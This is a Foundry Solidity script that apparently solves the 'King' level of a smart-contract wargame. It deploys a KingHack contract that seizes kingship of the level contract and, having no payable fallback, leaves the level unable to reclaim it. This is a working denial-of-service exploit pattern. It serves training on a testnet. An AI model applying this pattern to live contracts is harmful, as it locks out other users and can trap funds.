// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import {King} from "src/levels/King.sol";
import {KingHack} from "src/test/KingHack.sol";

contract KingScript is Script {
    uint256 private constant INSERT_COIN = 0.001 ether;

    function run() external {
        address kingContractAddress = vm.envAddress("KING_ADDRESS");
        uint256 attackerKey = vm.envUint("TESTNET_PRIVATE_KEY_1");
        King king = King(payable(kingContractAddress));

        vm.startBroadcast(attackerKey);

        KingHack kingHack = new KingHack();
        console.log("KingHack contract deployed at : ", address(kingHack));

        console.log("Performing hack ...");

        console.log("King To Be : ", address(kingHack));
        console.log("King Before Hack : ", king._king());

        // Perform hack. This causes the KingHack contract to assume kingship of the King contract.
        // Since the KingHack contract does not have receive or payable fallback functions, level cannot reclaim kingship.
        kingHack.hack{value: INSERT_COIN}(kingContractAddress);

        vm.stopBroadcast();

        console.log("King Before Hack : ", king._king());

        console.log("SUCCESS!!! Submit the instance.");
    }
}
